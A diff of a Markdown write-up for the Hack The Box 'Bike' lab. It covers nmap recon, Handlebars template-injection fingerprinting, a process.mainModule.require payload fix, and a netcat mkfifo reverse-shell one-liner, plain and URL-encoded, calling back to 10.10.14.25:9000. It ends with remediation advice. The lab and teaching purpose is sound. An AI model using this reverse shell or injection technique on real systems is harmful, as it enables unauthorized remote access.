@@ -1,47 +1,90 @@
-# Overview
-**Difficulty:** Very Easy  
-**Skills:** Server-Side Template Injection (SSTI), Template engine fingerprinting and payload crafting, Web proxy and payload delivery  
-**HTB Link:** https://app.hackthebox.com/starting-point  
-**Summary:** Exploited a Handlebars SSTI using process.mainModule.require to spawn a reverse shell, gain root, and capture the flag.  
+# CTF Write-up — bike from hackthebox.com
 
----
+> **Summary:** Exploited a Handlebars server-side template injection (SSTI) using `process.mainModule.require` to spawn a reverse shell, escalate to root, and capture the flag.  
+> **Difficulty:** Very Easy  
+> **HTB:** https://app.hackthebox.com/starting-point
+>
+![Tactics](https://img.shields.io/badge/Tactics-SSTI%20%7C%20Payload%20Dev%20%7C%20RCE-blue?style=flat-square)
+![Tools](https://img.shields.io/badge/Tools-Burp%20%7C%20Nmap-red?style=flat-square)
 
-# Steps
-
-## 1. Reconnaissance
-**port scan**
-- [nmap scan](./evidences/nmap.txt)  
-- `nmap -sV -sS 10.129.84.44 -oN nmap.txt`  
-- tcpwrapped server on port `80/tcp`  
-- ssh service on port `22/tcp`
-  
-**server-side template injection**  
-- [injection result](./evidences/server-side_template_injection_output.png)
-- tried a simple injection `{{7*7}}` and discovered the template engine is [handlebars](https://handlebarsjs.com)
 
 
 ---
 
-## 2. Resource Development
-**hacktrick exploit**
-- [hacktricks link to exploit](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html#handlebars-nodejs)
-- [burpsuite payload](./evidences/burpsuite_payload.png)
-- there's a problem with the exploit provided by hacktricks: the module require is not defined (since is not in global scope)
-
-**fixed hacktrick exploit**
-- [fixed burpsuite payload](./evidences/fixed_burpsuite_payload.png)
-- changing require with process.mainModule.require
-
-**listening socket for reverse shell**
-- `nc -lvnp 9000`
+## Table of contents
+1. [Reconnaissance](#reconnaissance)
+2. [Resource development](#resource-development)
+3. [Initial access](#initial-access)
+4. [Privilege escalation](#privilege-escalation)
+5. [Findings & recommendations](#findings--recommendations)
 
 ---
 
-## 3. Initial Access
-- we run the reverse shell command through burpsuite
-- [root access gained](./evidences/root_access.png)
-- [retrieve the flat](./evidences/flag.png)
+## Reconnaissance
+
+### Port scan
+- Performed an `nmap` scan and enumerated open services. See `evidences/nmap.txt`.  
+```bash
+nmap -sV -sS 10.129.84.44 -oN nmap.txt
+```
+- Results (high-level):
+  - `80/tcp` — HTTP (tcpwrapped)
+  - `22/tcp` — SSH
+
+### Template testing & fingerprinting
+- Performed simple template tests (e.g. `{{7*7}}`) and observed rendered output.  
+- Determined template engine: **Handlebars**: ![SSTI](evidences/server-side_template_injection_output.png)
 
 ---
 
-## 4. Privilege Escalation
+## Resource development
+
+### References and initial exploit idea
+- Referenced [HackTricks — SSTI / Handlebars](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html#handlebars) for RCE idea.
+
+### Payload engineering
+- Initial payload from HackTricks failed because `require` was not available in the expected scope: ![burpsuite fixed payload](evidences/burpsuite_payload.png) 
+- Adjusted approach to use `process.mainModule.require`: ![burpsuite fixed payload](evidences/fixed_burpsuite_payload.png)
+
+### reverse shell
+- we get from [reverse shell generator](https://www.revshells.com/) the reverse shell code to inject as payload:
+``` bash
+# regular version
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.25 9000 >/tmp/f
+# url encode version (the one that will be used)
+rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.10.14.25%209000%20%3E%2Ftmp%2Ff
+```
+
+### Listener
+- Started a netcat listener to receive the reverse shell:
+```bash
+nc -lvnp 9000
+```
+
+---
+
+## Initial access
+- Delivered the payload via Burp Suite and obtained iteractive shell as root: ![root shell](evidences/root_access.png)  
+- Retrieved flag:  
+![root flag](evidences/flag.png)
+
+---
+
+## Privilege escalation
+> *Section intentionally left concise — see `Findings & recommendations` for mitigation and next steps.*
+
+---
+
+## Findings & recommendations
+- not necessary in this case, since we accessed directly as `root`.
+
+### Key findings
+- The web application was vulnerable to Handlebars SSTI.
+- The application environment allowed access patterns enabling remote code execution via template injection.
+
+### Immediate remediation (high-level)
+1. **Sanitize/validate** all user-controllable template inputs; avoid directly rendering user-supplied strings as templates.  
+2. **Use a safe templating mode** or a sandboxed rendering environment when possible.  
+3. **Harden Node.js process permissions** and follow principle of least privilege for app user accounts.  
+4. **Update dependencies** and apply platform security best-practices (CSP, input validation, dependency scanning).  
+5. **Audit logs** to detect exploitation attempts, and rotate secrets/keys if there was suspected exposure.
